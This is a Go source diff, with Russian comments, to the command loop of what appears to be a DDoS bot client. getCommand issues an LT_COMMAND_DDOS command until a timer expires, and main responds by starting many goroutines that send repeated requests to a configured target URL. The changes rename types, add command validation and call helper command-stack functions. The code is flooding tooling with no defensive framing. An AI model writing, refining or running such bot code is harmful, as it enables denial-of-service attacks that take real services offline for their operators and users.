@@ -39,28 +39,43 @@ func performMultiRequest(url string, count int) {
 	}
 }
 
-func getCommand() (command utils.Command, err error) {
+func getCommand() (command utils.CommandType, err error) {
+	var cmd = utils.CommandType{}
 	counter += 1
 
 	// Получаем команду
 
 	// Проверяем команду
-	if !utils.IsCorrectCommand(command){
 
-	}
+	// Записываем ее в стек комманд хелпера (FIFO)
+
+	// Из шины потом прочитаем в эту функцию
 
 	// Считаем количество секунд и посылаем команду на завершение если время истекло
 	if counter >= settings.Seconds {
-		return utils.Command{2, utils.LT_COMMAND_STOP, nil}, err
+		return utils.CommandType{2, utils.LT_COMMAND_STOP, nil}, err
 	}
 
-	return utils.Command{1, utils.LT_COMMAND_DDOS, nil}, nil
+	cmd = utils.CommandType{1, utils.LT_COMMAND_DDOS, nil}
+
+	ok, err := utils.IsCorrectCommand(cmd)
+	if !ok {
+		panic(err)
+	}
+
+	return cmd, err
 }
 
 func main() {
 	var last_command_id = -1
 
 	utils.WriteLog("Start.")
+
+	var h = utils.Helper
+	utils.WriteLog(h)
+
+	utils.PutCommand()
+	utils.GetCommand()
 
 	for {
 
@@ -72,7 +87,7 @@ func main() {
 
 			last_command_id = command.Id
 
-			switch command.Command {
+			switch command.Name {
 			case utils.LT_COMMAND_DDOS:
 				for i := 0; i < settings.NumberOfRoutines; i++ {
 					go performMultiRequest(settings.Url+"?a="+strconv.Itoa(i), settings.RequPerRoutine)
